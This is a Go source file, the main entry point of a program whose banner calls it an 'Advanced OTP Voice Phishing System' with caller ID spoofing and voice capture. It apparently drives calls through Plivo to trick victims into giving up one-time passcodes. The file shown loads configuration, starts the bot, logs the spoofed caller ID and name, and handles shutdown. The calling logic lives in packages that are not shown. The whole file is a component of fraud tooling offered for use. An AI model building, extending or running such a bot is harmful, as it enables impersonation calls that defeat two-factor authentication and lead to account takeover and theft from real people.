package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/USERNAME/goland-otpbot-api/bot"
	"github.com/USERNAME/goland-otpbot-api/config"
)

var (
	version = "1.1.0"
)

func main() {
	
	configPath := flag.String("config", "config.yml", "Path to config file")
	flag.Parse()

	
	printBanner()

	
	_, err := config.Load(*configPath)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	
	cfg, err := config.Get()
	if err != nil {
		log.Fatalf("Failed to get config: %v", err)
	}

	
	if validationErrors := cfg.Validate(); len(validationErrors) > 0 {
		log.Printf("⚠️  Config validation warnings:")
		for _, e := range validationErrors {
			log.Printf("   - %s", e)
		}
		log.Println("   Some features may not work without these values.")
	}

	
	createDirs(cfg)

	
	otpBot, err := bot.NewBot(cfg)
	if err != nil {
		log.Fatalf("Failed to initialize bot: %v", err)
	}

	
	if err := otpBot.Start(); err != nil {
		log.Fatalf("Failed to start bot: %v", err)
	}

	
	log.Printf("🍕 Pizza OTP Bot v%s is running!", version)
	log.Printf("📱 Bot token: %s...", maskString(cfg.BotToken, 10))
	log.Printf("📞 Plivo number: %s", cfg.PlivoNumber)
	log.Printf("🗄️  Database: %s", cfg.DatabasePath)
	log.Printf("⚡ Concurrency: %d", cfg.Concurrency)
	log.Printf("🎭 Spoof CallerID: %s", cfg.CallerID)
	log.Printf("🎭 Spoof CallerName: %s", cfg.CallerName)

	
	waitForShutdown(otpBot)
}


func printBanner() {
	banner := `

    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ██████╗ ██████╗ ██████╗ ██████╗  ╔══╗              ║
    ║   ██╔══██╗██╔══██╗██╔══██╗██╔══██╗ ║  ║              ║
    ║   ██████╔╝██████╔╝██████╔╝██║  ██║ ║  ║              ║
    ║   ██╔══██╗██║  ██║██║  ██║██║  ██╗ ║  ║              ║
    ║   ██████╔╝██║  ██║██║  ██║██████╔╝ ║  ║              ║
    ║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚══╝              ║
    ║                                                       ║
    ║   ██████╗  █████╗ ██████╗ ██████╗                     ║
    ║   ██╔══██╗██╔══██╗██╔══██╗██╔══██╗                    ║
    ║   ██████╔╝███████║██████╔╝██████╔╝                    ║
    ║   ██╔══██╗██╔══██║██╔══██╗██╔══██╗                    ║
    ║   ██████╔╝██║  ██║██║  ██║██║  ██║                    ║
    ║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                    ║
    ║                                                       ║
    ║   🔮 Advanced OTP Voice Phishing System v%s            ║
    ║   🎭 Caller ID Spoofing • 📞 Voice Capture            ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝

`
	fmt.Printf(banner, version)
}


func createDirs(cfg *config.Config) {
	dirs := []string{
		"./data",
		"./logs",
	}

	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Printf("Warning: Failed to create directory %s: %v", dir, err)
		}
	}
}



func waitForShutdown(otpBot *bot.Bot) {
	
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	
	<-sigChan

	log.Println("\n🛑 Shutting down...")
	otpBot.Stop()
	log.Println("✅ Bot stopped gracefully")
}



func maskString(s string, visible int) string {
	if len(s) <= visible {
		return s
	}
	return s[:visible] + "..."
}
